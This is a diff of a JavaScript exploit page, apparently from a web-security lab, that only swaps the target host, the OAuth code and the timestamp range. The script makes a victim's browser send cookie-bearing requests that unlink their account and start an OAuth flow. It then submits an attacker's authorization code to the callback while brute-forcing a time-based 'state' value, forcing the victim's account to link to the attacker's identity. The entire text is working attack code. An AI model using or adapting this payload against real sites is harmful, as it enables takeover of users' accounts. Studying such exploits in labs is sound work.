@@ -14,7 +14,7 @@
 
     
     try {
-        await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/unlink", {
+        await fetch("http://ptl-70a53532-e23265ca.libcurl.so/unlink", {
             credentials: 'include'
         })
     }
@@ -23,18 +23,18 @@
     }
 
     try {
-        await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/users/auth/myprovider", {
+        await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider", {
             credentials: 'include'
         })
     }
     catch(e) {
         console.log("BB"+e);
     }
-    for (let m=24; m<28; m++)
+    for (let m=38; m<42; m++)
     {
         for (let s=0;s<60;s++) {
             try {
-                await fetch("http://ptl-1801d3a9-e148ea13.libcurl.so/users/auth/myprovider/callback?code=4b9d0d3f70389a3cdd5bfecf88020485e6481d5409649e4715b31a8bcecfbaf7&state=2021080810"+zeroPad(m,2)+zeroPad(s,2), {
+                await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider/callback?code=f85a1d8e40488afc324c9eb2cceccd2bcb7a2a0494c7a4e9a6f9796fc69aebd8&state=2021080810"+zeroPad(m,2)+zeroPad(s,2), {
                     credentials: 'include'
                 })
             }
